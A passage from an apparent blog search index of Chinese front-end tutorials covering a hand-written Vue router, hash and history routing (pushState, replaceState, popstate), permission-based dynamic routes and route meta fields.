keyword">this</span>        Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"router-view"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            <span class="token function">render</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 获取组件</span>                <span class="token keyword">const</span> cm<span class="token operator">=</span>self<span class="token punctuation">.</span>routeMap<span class="token punctuation">[</span>self<span class="token punctuation">.</span>data<span class="token punctuation">.</span>current<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// current响应式数据，会重新渲染组件</span>                <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span>cm<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">initEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">hashChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span> <span class="token punctuation">{</span>            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> <span class="token string">'#/'</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>current <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>history模式和hash模式</title>
      <link href="2020/09/11/%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1-history%E6%A8%A1%E5%BC%8F%E5%92%8Chash%E6%A8%A1%E5%BC%8F/"/>
      <url>2020/09/11/%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1-history%E6%A8%A1%E5%BC%8F%E5%92%8Chash%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li>hash模式</li><li>history模式</li><li>根据权限动态添加路由列表</li><li>配置路由meta属性</li></ul><blockquote><p>前端随着 ajax 的流行，数据请求可以在不刷新浏览器的情况下进行。异步交互体验中最盛行的就是 SPA —— 单页应用。单页应用不仅仅是在页面交互时无刷新的，连页面跳转都是无刷新的，为了实现单页应用，所以就有了前端路由。 </p></blockquote><h2 id="hash模式"><a href="#hash模式" class="headerlink" title="hash模式"></a>hash模式</h2><p><strong>#的涵义</strong></p><ul><li>#代表网页中的一个位置,右面的字符就是代表的位置</li><li><code>http://localhost：8081/cbuild/index.html#first</code>就代表网页index.html的first位置。浏览器读取这个URL后，会自动将first位置滚动至可视区域。</li></ul><p><strong>#后的字符</strong></p><ul><li><p>在第一个#后面出现的任何字符，都会被浏览器解读为位置标识符。这意味着，这些字符都不会被发送到服务器端。</p></li><li><p>比如，下面URL的原意是指定一个颜色值：<code>http://www.example.com/?color=#fff</code>但是，浏览器实际发出的请求是”#fff”被省略了。只有将#转码为%23，浏览器才会将其作为实义字符处理。也就是说，上面的网址应该被写成：<code>http://example.com/?color=%23fff</code></p></li></ul><p><strong>改变#不触发网页重载</strong></p><ul><li>单单改变#后的部分，浏览器只会滚动到相应位置，不会重新加载网页。</li><li>比如，从<code>http://www.example.com/index.html#location1</code>改成<code>http://www.example.com/index.html#location2</code>浏览器不会重新向服务器请求index.html。</li></ul><p><strong>改变#会改变浏览器的访问历史</strong></p><ul><li>每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用”后退”按钮，就可以回到上一个位置。</li></ul><p><strong>window.location.hash读取#值</strong></p><ul><li>window.location.hash这个属性可读可写。读取时，可以用来判断网页状态是否改变；写入时，则会在不重载网页的前提下，创造一条访问历史记录。</li></ul><p><strong>onhashchange事件</strong></p><ul><li>这是一个HTML 5新增的事件，当#值发生变化时，就会触发这个事件。</li><li>window.addEventListener(“hashchange”,func, false);</li></ul><p><strong>思路</strong></p><blockquote><p>当URL的片段标识符更改时，将触发<strong>hashchange</strong>事件 (跟在＃符号后面的URL部分，包括＃符号),然后根据hash值做些路由跳转处理的操作.具体参数可以访问<code>location</code>查看</p></blockquote><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- hashchange 触发页面改变 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#/a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#/b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#/c<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>view<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">      <span class="token keyword">var</span> view <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 页面加载完不会触发 hashchange，这里主动触发一次 hashchange 事件</span>      <span class="token comment" spellcheck="true">// 该事件快于onLoad,所以需要在这里操作</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        view <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#view'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">viewChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 监听路由变化</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> viewChange<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 渲染视图</span>      <span class="token keyword">function</span> <span class="token function">viewChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">case</span> <span class="token string">'#/b'</span><span class="token punctuation">:</span>            view<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token string">'#/c'</span><span class="token punctuation">:</span>            view<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">default</span><span class="token punctuation">:</span>            view<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="history模式"><a href="#history模式" class="headerlink" title="history模式"></a>history模式</h2><p>window.history(可直接写成history)指向History对象，它表示当前窗口的浏览历史。</p><p>History对象保存了当前窗口访问过的所有页面网址</p><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><ul><li>history.length属性保存着历史记录的url数量，初始时该值为1，如果当前窗口先后访问了三个网址，那么history对象就包括3项，history.length=3</li></ul><p><strong>跳转方法</strong></p><ul><li><strong>go()</strong> 接受一个整数为参数，移动到该整数指定的页面，比如<code>history.go(1)</code>相当于<code>history.forward()</code>,<code>history.go(-1)</code>相当于<code>history.back()</code>,<code>history.go(0)</code>相当于刷新当前页面</li><li><strong>back()</strong> 移动到上一个访问页面，等同于浏览器的后退键,常见的返回上一页就可以用<code>back()</code>，是从浏览器缓存中加载，而不是重新要求服务器发送新的网页</li><li><strong>forward()</strong> 移动到下一个访问页面，等同于浏览器的前进键</li></ul><p>如果移动的位置超出了访问历史的边界，以上三个方法并不报错，而是默默的失败</p><h3 id="history-pushState"><a href="#history-pushState" class="headerlink" title="history.pushState()"></a>history.pushState()</h3><p>history.pushstate() 方法接受三个参数，以此为：</p><ul><li><strong>state</strong>: 一个与指定网址相关的状态对象，popState事件触发时，该对象会传入回调函数，如果不需要这个对象，此处可填null</li><li><strong>title</strong>: 新页面的标题，但是所有浏览器目前都忽略这个值，因此这里可以填null</li><li><strong>url</strong>: 新的网址，必须与当前页面处在同一个域，浏览器的地址栏将显示这个网址</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 假定当前网址是example.com/1.html，我们使用pushState方法在浏览记录(history对象)中添加一个记录</span><span class="token keyword">var</span> stateObj <span class="token operator">=</span> <span class="token punctuation">{</span>foo<span class="token punctuation">:</span><span class="token string">'bar'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>stateObj<span class="token punctuation">,</span><span class="token string">'page 2'</span><span class="token punctuation">,</span><span class="token string">'2.html'</span><span class="token punctuation">)</span></code></pre><blockquote><p>添加上边这个新纪录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，<strong>它只是成为浏览历史中的新纪录</strong>。这时，你在地址栏输入一个新的地址，然后点击了后退按钮，页面的<code>url</code>将显示<code>2.html</code>；你再点击以此后退按钮，<code>url</code>将显示<code>1.html</code></p></blockquote><p><strong>总之，pushState方法不会触发页面刷新，只是导致了history对象发生变化，地址栏会有反应</strong></p><p>如果pushState的url参数，设置了一个新的锚点值（即hash），并不会触发hashChange事件，如果设置了一个跨域网址，则会报错。</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//报错</span>history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">'https://twitter.com/hello'</span><span class="token punctuation">)</span></code></pre><p>上边代码中，pushState()想要插入一个跨域的网址，导致报错，这样设计的目的是防止恶意代码让用户以为他们是在另一个网站上.</p><h3 id="history-replaceState"><a href="#history-replaceState" class="headerlink" title="history.replaceState()"></a>history.replaceState()</h3><p><strong>history.replaceState()</strong> 方法的参数和 <strong>pushState()</strong> 方法一摸一样，区别是它修改浏览器历史当中的记录</p><p>假定当前页面是<code>example.com/example.html</code></p><pre class=" language-js"><code class="language-js">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>page<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'title 1'</span><span class="token punctuation">,</span><span class="token string">'?page=1'</span><span class="token punctuation">)</span>history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>page<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'title 2'</span><span class="token punctuation">,</span><span class="token string">'?page=2'</span><span class="token punctuation">)</span>history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>page<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'title 3'</span><span class="token punctuation">,</span><span class="token string">'?page=3'</span><span class="token punctuation">)</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//url显示为example.com/example.html?page=1</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//url显示为example.com/example.html</span>history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//url显示为example.com/example.html?page=3</span></code></pre><h3 id="popState-事件"><a href="#popState-事件" class="headerlink" title="popState 事件"></a>popState 事件</h3><ul><li><p>每当同一个文档的浏览历史（即history）出现变化时，就会触发popState事件</p></li><li><p>需要注意：仅仅调用pushState方法或replaceState方法，并不会触发该事件，只有用户点击浏览器后退和前进按钮时，或者使用js调用back、forward、go方法时才会触发。另外该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件不会被触发</p></li><li><p>使用的时候，可以为popState事件指定回调函数</p></li></ul><pre class=" language-js"><code class="language-js">window<span class="token punctuation">.</span>onpopstate <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'location: '</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state: '</span> <span class="token operator">+</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 或者</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'popstate'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'location: '</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state: '</span> <span class="token operator">+</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>回调函数的参数是一个event事件对象，它的state属性指向pushState和replaceState方法为当前url所提供的状态对象（即这两个方法的第一个参数）。上边代码中的event.state就是通过pushState和replaceState方法为当前url绑定的state对象</p><p>那既然调用pushState方法或replaceState方法，并不会触发popState事件，要怎么处理呢？</p><blockquote><p><strong>解决思路：</strong>我们可以通过遍历页面上的所有 <code>a</code> 标签，阻止 <code>a</code> 标签的默认事件的同时，加上点击事件的回调函数，在回调函数内获取 <code>a</code> 标签的 <code>href</code> 属性值，再通过 <code>pushState</code>去改变浏览器的 <code>location.pathname</code> 属性值。然后手动执行 <code>popstate</code> 事件的回调函数，去匹配相应的路由。</p></blockquote><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- popstate 和点击事件 触发页面改变 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/c<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>view<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">      <span class="token keyword">var</span> view <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        view <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#view'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        document          <span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'a[href]'</span><span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>e <span class="token operator">=</span><span class="token operator">></span> e<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>_e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            _e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">viewChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">viewChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 监听路由变化</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'popstate'</span><span class="token punctuation">,</span> viewChange<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 渲染视图</span>      <span class="token keyword">function</span> <span class="token function">viewChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">case</span> <span class="token string">'/b'</span><span class="token punctuation">:</span>            view<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token string">'/c'</span><span class="token punctuation">:</span>            view<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">default</span><span class="token punctuation">:</span>            view<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="根据权限动态添加路由列表"><a href="#根据权限动态添加路由列表" class="headerlink" title="根据权限动态添加路由列表"></a>根据权限动态添加路由列表</h2><ul><li>业务场景：不同用户调用权限接口获得的权限是不同的，根据用户权限动态展示路由列表</li></ul><pre class=" language-js"><code class="language-js">         api<span class="token punctuation">.</span><span class="token function">getAuditInfo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>             account<span class="token punctuation">:</span> username<span class="token punctuation">,</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'权限代码:'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">// 高级权限：可以查看某一块路由</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'auth0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 window<span class="token punctuation">.</span>authInfo <span class="token operator">=</span> <span class="token boolean">true</span>                 <span class="token comment" spellcheck="true">// 添加路由</span>                 <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">addRoutes</span><span class="token punctuation">(</span>videoRoutes<span class="token punctuation">)</span>                 <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span>options<span class="token punctuation">.</span>routes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>videoRoutes<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">// 普通权限</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'auth1'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>res<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'auth0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 window<span class="token punctuation">.</span>authInfo <span class="token operator">=</span> <span class="token boolean">false</span>             <span class="token comment" spellcheck="true">// 没有权限时返回</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                 window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> `             <span class="token punctuation">}</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="配置路由meta属性"><a href="#配置路由meta属性" class="headerlink" title="配置路由meta属性"></a>配置路由meta属性</h2><ul><li>业务场景：同一个组件在不同路由下的展示状态是不同的，这时可以配置路由meta属性来实现</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>        path<span class="token punctuation">:</span> <span class="token string">'/audit/video'</span><span class="token punctuation">,</span>        name<span class="token punctuation">:</span> <span class="token string">'视频管理'</span><span class="token punctuation">,</span>        component<span class="token punctuation">:</span> Layout<span class="token punctuation">,</span>        children<span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token punctuation">:</span> <span class="token string">'videoList'</span><span class="token punctuation">,</span>                name<span class="token punctuation">:</span> <span class="token string">'视频列表'</span><span class="token punctuation">,</span>                meta<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    noCache<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                    cityChange<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                component<span class="token punctuation">:</span> auditvideoList            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                path<span class="token punctuation">:</span> <span class="token string">'auditList'</span><span class="token punctuation">,</span>                name<span class="token punctuation">:</span> <span class="token string">'审核列表'</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 配置 meta 属性</span>                meta<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    noCache<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                    cityDefault<span class="token punctuation">:</span> <span class="token boolean">true</span>                 <span class="token punctuation">}</span><span class="token punctuation">,</span>                component<span class="token punctuation">:</span> auditList            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        path<span class="token punctuation">:</span> <span class="token string">'*'</span><span class="token punctuation">,</span>        redirect<span class="token punctuation">:</span> <span class="token string">'/audit/agent'</span><span class="token punctuation">,</span>        hidden<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><ul><li>比如说 header 中的一个组件，不同路由页面均展示，只是状态不同</li></ul><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>!cityDefault<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-else</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">computed<span class="token 